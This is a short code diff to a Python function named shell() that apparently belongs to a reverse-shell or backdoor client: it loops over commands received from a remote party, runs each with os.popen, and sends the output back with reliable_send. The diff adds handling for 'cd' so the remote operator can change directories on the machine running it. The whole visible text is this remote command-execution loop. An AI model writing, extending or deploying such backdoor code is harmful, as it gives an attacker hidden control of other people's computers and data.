@@ -27,6 +27,11 @@ def shell():
         if cmd == "exit":
             reliable_send("exiting...")
             break
+        elif cmd[:2] == "cd" and len(cmd) > 1:
+            try:
+                os.chdir(cmd[3:])
+            except:
+                continue
         try:
             proc = os.popen(cmd)  # open a process to run commands on shell
             res = proc.read()  # command result
